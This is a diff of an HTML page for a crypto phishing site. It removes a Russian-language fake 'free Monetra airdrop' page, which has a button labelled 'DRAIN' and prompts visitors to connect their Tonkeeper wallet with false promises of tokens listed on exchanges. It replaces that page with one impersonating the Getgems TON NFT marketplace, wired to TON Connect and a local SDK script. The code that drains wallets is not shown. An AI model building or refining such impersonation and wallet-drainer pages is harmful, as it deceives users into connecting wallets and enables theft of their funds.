@@ -3,79 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Бесплатный Airdrop Monetra</title>
+    <title>Getgems — TON NFT Marketplace</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="./css/style.css">
 </head>
 <body>
-    <div id="ton-connect"></div>
-    <button id="drain-btn" class="drain-button">DRAIN</button>
     
     <header class="site-header">
         <nav class="navbar">
             <div class="logo-container">
-                <img src="images/coin1.png" alt="Monetra Logo" class="logo-img">
-                <span class="logo-text">Monetra</span>
+                <img src="images/logo.png" alt="Marketplace Logo" class="logo-img">
+                <span class="logo-text">getgems</span>
+            </div>
+            <div class="search-bar">
+                <input type="text" placeholder="Search items, collections, and accounts">
             </div>
             <div class="nav-links">
-                <a href="https://t.me/your_channel_name" target="_blank" class="nav-link">Наш телеграм</a>
-                <button id="open-exchanges-modal" class="nav-link button-like">Биржи</button>
+                <a href="#" class="nav-link">Explore</a>
+                <a href="#" class="nav-link">Stats</a>
+                <a href="#" class="nav-link">Create</a>
+                <div id="ton-connect"></div>
             </div>
         </nav>
     </header>
     
     <div class="main-container">
-        <div class="content-wrapper">
-            <h1 class="title">Получи бесплатно <span class="highlight">50,000</span> монет нового токена!</h1>
-            <p class="subtitle">Он вот-вот выйдет на все биржи по цене <span class="price">$1</span> за монету.</p>
-            <p class="description">
-                Вам стоит лишь привязать свой крипто-кошелек и получить токены на баланс!
-            </p>
-            <button id="open-tonkeeper-modal" class="cta-button">Получить токены</button>
+        <div class="hero-section">
+             <h1 class="title">Discover, collect, and sell extraordinary <span class="highlight">NFTs</span></h1>
+             <p class="subtitle">The largest NFT marketplace on The Open Network</p>
         </div>
-    </div>
 
-    <!-- Модальное окно для бирж -->
-    <div id="exchanges-modal" class="modal-overlay">
-        <div class="modal-content">
-            <button id="close-exchanges-modal" class="modal-close">&times;</button>
-            <h2>Скоро на биржах</h2>
-            <ul class="exchanges-list">
-                <li><a href="https://www.binance.com/" target="_blank">Binance</a></li>
-                <li><a href="https://www.coinbase.com/" target="_blank">Coinbase</a></li>
-                <li><a href="https://www.kraken.com/" target="_blank">Kraken</a></li>
-                <li><a href="https://www.kucoin.com/" target="_blank">KuCoin</a></li>
-                <li><a href="https://www.bybit.com/" target="_blank">Bybit</a></li>
-                <li><a href="https://www.okx.com/" target="_blank">OKX</a></li>
-                <li><a href="https://www.gate.io/" target="_blank">Gate.io</a></li>
-                <li><a href="https://www.huobi.com/" target="_blank">Huobi</a></li>
-                <li><a href="https://www.bitfinex.com/" target="_blank">Bitfinex</a></li>
-                <li><a href="https://crypto.com/" target="_blank">Crypto.com</a></li>
-                <li><a href="https://www.bitstamp.net/" target="_blank">Bitstamp</a></li>
-                <li><a href="https://www.mexc.com/" target="_blank">MEXC</a></li>
-            </ul>
-        </div>
-    </div>
-
-    <!-- Модальное окно для Tonkeeper -->
-    <div id="tonkeeper-modal" class="modal-overlay">
-        <div class="modal-content">
-            <button id="close-tonkeeper-modal" class="modal-close">&times;</button>
-            <h2>Подключите ваш Tonkeeper кошелек</h2>
-            <p class="modal-description">
-                Для получения бесплатных токенов Monetra, пожалуйста, подключите ваш Tonkeeper кошелек.
-                Это позволит нам безопасно перевести токены на ваш баланс.
-                Убедитесь, что вы используете официальное приложение Tonkeeper.
-            </p>
-            <button id="connect-tonkeeper-btn" class="cta-button tonkeeper-button">Подключить Tonkeeper</button>
+        <div class="nft-gallery">
+            <h2 class="gallery-title">Trending NFTs</h2>
+            <div id="nft-grid" class="nft-grid">
+                <!-- NFTs will be injected here by JavaScript -->
+            </div>
         </div>
     </div>
 
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="./tonsdk.js"></script>
-    <script src="./js/script.js"></script>
 </body>
 </html>
